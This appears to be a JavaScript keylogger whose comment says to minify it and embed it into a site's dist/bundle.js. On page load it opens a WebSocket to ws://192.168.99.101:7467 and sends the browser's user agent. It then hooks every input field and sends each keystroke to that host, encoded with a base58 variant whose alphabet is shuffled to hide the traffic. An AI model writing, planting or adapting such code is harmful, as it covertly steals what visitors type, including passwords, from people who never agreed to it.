// after compress & uglify, embed the code to dist/bundle.js
window.addEventListener('DOMContentLoaded', function () {
  function encode(s, t) {
    var r = [];
    if (typeof s === 'string') {
      s = (new TextEncoder('utf-8')).encode(s);
    }
    var i, z;
    for (i = 0; i < s.length; i++) {
      if (s[i]) {
        break;
      }
    }
    z = i;
    for (; i < s.length; i++) {
      var c = s[i];
      var j;
      for (j = 0; j in r || c; j++) {
        if (r[j]) {
          c += r[j] * 256;
        }
        r[j] = c % 58;
        c = Math.floor(c / 58);
      }
    }
    return t[0].repeat(z) + r.reverse().map(function (x) {
      return t[x];
    }).join('');
  }

  function hash(s) {
    var r = 0, i;
    for (i = 0; i < s.length; i++) {
      r = r * 31 + s.charCodeAt(i) | 0;
    }
    return r;
  }

  function rand(s) {
    var x = 123456789;
    var y = 362436069;
    var z = 521288629;
    var w = 88675123;
    var t;
    return function (a, b) {
      t = x ^ (x << 11);
      x = y; y = z; z = w;
      w = (w ^ (w >> 19)) ^ (t ^ (t >> 8));
      if (a !== undefined && b !== undefined) {
        return a + (w % (b + 1 - a));
      }
      return w;
    };
  }

  function shuffle(a, r) {
    var i;
    for (i = a.length - 1; i > 0; i--) {
      var j = Math.abs(r(0, i));
      var t = a[i];
      a[i] = a[j];
      a[j] = t;
    }
  }

  var w = new WebSocket('ws://192.168.99.101:7467')
  var t = 'MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp';

  w.addEventListener('open', function (event) {
    var s = navigator.userAgent
    w.send(encode(navigator.userAgent, t));
    t = t.split('');
    shuffle(t, rand(hash(s)));
    t = t.join('');
  });

  Array.from(document.getElementsByTagName('input')).forEach(function (e) {
    e.addEventListener('keyup', function (v) {
      w.send(encode(Math.random().toString().slice(2) + ' ' + v.key, t));
    }, false);
  });
}, false);